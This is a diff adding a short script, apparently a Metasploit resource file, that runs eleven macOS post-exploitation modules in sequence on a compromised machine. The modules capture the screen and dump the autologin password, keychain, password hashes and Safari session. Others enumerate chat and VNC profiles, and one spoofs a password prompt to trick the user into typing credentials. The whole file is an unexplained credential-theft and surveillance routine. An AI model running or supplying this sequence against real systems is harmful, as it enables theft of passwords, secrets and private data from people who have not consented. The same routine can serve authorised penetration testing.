@@ -1,0 +1,11 @@
+run post/osx/capture/screen
+run post/osx/gather/autologin_password
+run post/osx/gather/enum_adium
+run post/osx/gather/enum_airport
+run post/osx/gather/enum_chicken_vnc_profile
+run post/osx/gather/enum_colloquy
+run post/osx/gather/enum_keychain
+run post/osx/gather/enum_osx
+run post/osx/gather/password_prompt_spoof
+run post/osx/gather/safari_lastsession
+run post/osx/gather/hashdump
